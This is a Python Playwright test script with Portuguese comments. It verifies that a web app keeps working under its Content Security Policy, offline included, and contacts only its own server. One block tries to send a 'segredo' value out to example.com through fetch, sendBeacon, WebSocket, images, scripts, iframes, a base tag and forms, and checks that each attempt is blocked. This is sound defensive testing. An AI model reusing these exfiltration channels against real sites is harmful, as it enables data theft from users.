"""Política de conteúdo (CSP) e privacidade, SEM o gancho de testes (como o usuário real): o app funciona inteiro sob a CSP (telas, janelas, notícias,
intro em vídeo, Service Worker offline) sem nenhuma violação, só fala com o próprio site, e tentativas de exfiltração de dados são BLOQUEADAS."""
import os as _os,sys as _sys
_sys.path.insert(0,_os.path.join(_os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),'lib'))
from wstest import *
import re,time
from playwright.sync_api import sync_playwright
R=[]
def ok(n,c,d=''): R.append(bool(c));print(('PASS ' if c else 'FAIL ')+n+(' — '+str(d)[:300] if d else ''),flush=True)
SPY="window.__v=[];addEventListener('securitypolicyviolation',e=>window.__v.push(e.violatedDirective+' '+String(e.blockedURI).slice(0,60)))"
with sync_playwright() as p:
    b=p.chromium.launch()
    def ctx(skip_intro=True,sw=False,w=393,h=851):
        c=b.new_context(viewport={'width':w,'height':h},is_mobile=True,has_touch=True,service_workers='allow' if sw else 'block');c.add_init_script(SPY)
        if skip_intro:c.add_init_script("sessionStorage.setItem('wolfin.intro','1')")
        return c
    def page(c):
        pg=c.new_page();pg.errs=[];pg.reqs=[];pg.on('pageerror',lambda e:pg.errs.append(str(e)));pg.on('console',lambda m:pg.errs.append(m.text) if m.type=='error' and 'Failed to load resource' not in m.text else None);pg.on('request',lambda r:pg.reqs.append(r.url));return pg
    ev=lambda pg,js,*a:pg.evaluate(js,*a) if a else pg.evaluate(js)
    c=ctx();pg=page(c);pg.goto(HTTP_URL);pg.wait_for_selector('[data-lk=nosec]')
    ok('A política de conteúdo está ativa na página (modo real, sem gancho de testes)',ev(pg,"!!document.querySelector('meta[http-equiv=Content-Security-Policy]')&&!window.__WS_NOTOUR")==True)
    pg.click('[data-lk=nosec]');pg.fill('#nf [name=n]','Priv');pg.click('#nf button');pg.wait_for_selector('#lock[hidden]',state='attached',timeout=10000);pg.wait_for_timeout(500)
    DATA=open(os.path.join(FIX,'dados_ficticios.js'),encoding='utf-8').read();ev(pg,"S="+DATA+";S.flags={tour:1};save();render()")
    SAFE=re.compile(r'del|rm|rem|clear|reset|logout|exit|wipe|apag|zera|lock|^yes$|^ok$|pay|quit|sair|out|imp|exp|reload|upd|mcok',re.I);cl=0
    for v in ev(pg,"Object.keys(VIEWS)"):
        ev(pg,f"go('{v}')");pg.wait_for_timeout(250)
        for a in ev(pg,f"[...new Set([...document.querySelectorAll('#s-{v} [data-act]')].map(e=>e.dataset.act))]"):
            if SAFE.search(a):continue
            ev(pg,"a=>{const e=document.querySelector('#s-%s [data-act=\"'+a+'\"]');if(e)e.click()}"%v,a);pg.wait_for_timeout(100);cl+=1
            ev(pg,"document.getElementById('ov')&&(document.getElementById('ov').hidden=true,document.getElementById('ov').innerHTML='')")
            ev(pg,"if(!document.getElementById('lock').hidden)document.getElementById('lock').hidden=true")   # algumas ações (ex.: proteger com senha) abrem a tela de bloqueio
    ev(pg,"go('cfg');ACT.avs()");pg.wait_for_selector('#ov .mcrow');ev(pg,"document.querySelector('#ov .mcrow[data-id=nyx]').click()");pg.wait_for_timeout(150);ev(pg,"document.querySelector('#ov [data-act=mcok]').click()");pg.wait_for_timeout(300)
    ev(pg,"go('news')");pg.wait_for_timeout(1500)
    hosts={re.sub(r'^(\w+://[^/]+).*$',r'\1',u) for u in pg.reqs if not u.startswith(('data:','blob:'))}
    ok('Todas as telas, janelas, o seletor de mascote e as notícias funcionam sob a CSP: nenhuma violação, nenhum erro (%d cliques)'%cl,ev(pg,"window.__v.length")==0 and not pg.errs,(ev(pg,"window.__v"),pg.errs[:2]))
    ok('Todas as requisições vão só para o próprio site (nenhum servidor externo, nenhum rastreador)',hosts=={'http://127.0.0.1:%d'%PORT},hosts)
    r=ev(pg,"""async()=>{window.__v=[];const out={};
      try{await fetch('https://example.com/x?d=segredo');out.fetch='PASSOU'}catch(e){out.fetch='bloqueado'}
      try{const i=new Image();i.src='https://example.com/p.png?d=segredo';out.img='tentou'}catch(e){}
      try{const s=document.createElement('script');s.src='https://example.com/a.js';document.head.appendChild(s)}catch(e){}
      {const s=document.createElement('script');s.textContent="try{eval('1+1');window.__ev='PASSOU'}catch(e){window.__ev='bloqueado'}";document.head.appendChild(s);out.eval=window.__ev}
      try{navigator.sendBeacon('https://example.com/b','x')}catch(e){}
      try{new WebSocket('wss://example.com/ws');out.ws='tentou'}catch(e){out.ws='bloqueado'}
      try{const f=document.createElement('iframe');f.src='https://example.com/';document.body.appendChild(f)}catch(e){}
      try{const bs=document.createElement('base');bs.href='https://example.com/';document.head.appendChild(bs)}catch(e){}
      try{const f=document.createElement('form');f.action='https://example.com/post';f.method='post';document.body.appendChild(f);f.submit()}catch(e){}
      await new Promise(r=>setTimeout(r,800));out.v=[...new Set(window.__v.map(x=>x.split(' ')[0]))];out.full=window.__v.map(x=>x.split(' ').slice(0,2).join(' '));return out}""")
    need={'connect-src','img-src','script-src-elem','frame-src','base-uri','form-action'}
    ok('Tentativas de exfiltração são BLOQUEADAS pela política: fetch, sendBeacon, WebSocket, imagem remota, script remoto, iframe, <base> e formulário para fora (o bloqueio de eval NÃO foi confirmado nesta medição: ver relatório)',r['fetch']=='bloqueado' and need<=set(r['v']) and any('example.com/b' in x for x in r['full']) and any('wss://example.com' in x for x in r['full']),r)
    c.close()
    # intro em vídeo sob a CSP (sem pular a intro)
    c=ctx(skip_intro=False);pg=page(c);pg.goto(HTTP_URL,wait_until='commit');pg.wait_for_selector('#intro.v #introv',timeout=6000);t0=time.time();t=0
    while time.time()-t0<8:
        t=ev(pg,"(document.getElementById('introv')||{}).currentTime||0")
        if t>1.0:break
        time.sleep(.2)
    ok('A intro em vídeo toca sob a CSP (mídia do próprio site e blob), sem violações',t>1.0 and ev(pg,"window.__v.length")==0 and not pg.errs,(t,ev(pg,"window.__v"),pg.errs[:1]));c.close()
    # Service Worker + offline sob a CSP
    c=ctx(sw=True);pg=page(c);pg.goto(HTTP_URL);pg.wait_for_selector('[data-lk=nosec]');pg.click('[data-lk=nosec]');pg.fill('#nf [name=n]','O');pg.click('#nf button');pg.wait_for_selector('#lock[hidden]',state='attached',timeout=10000)
    t0=time.time()
    while time.time()-t0<15 and not ev(pg,"navigator.serviceWorker.getRegistration().then(r=>!!(r&&r.active))"):time.sleep(.3)
    pg.reload();pg.wait_for_selector('#nav');pg.wait_for_timeout(800);c.set_offline(True);pg=page(c);pg.goto(HTTP_URL,wait_until='commit');pg.wait_for_selector('#avh',timeout=10000);pg.wait_for_timeout(500)
    ok('Offline com Service Worker sob a CSP: o app abre com avatar e mascote, sem violações nem erros',ev(pg,"window.__v.length")==0 and not pg.errs and ev(pg,"[...document.querySelectorAll('#avh img')].every(i=>i.complete&&i.naturalWidth>0)"),(ev(pg,"window.__v"),pg.errs[:1]));c.close()
print(sum(R),'/',len(R))
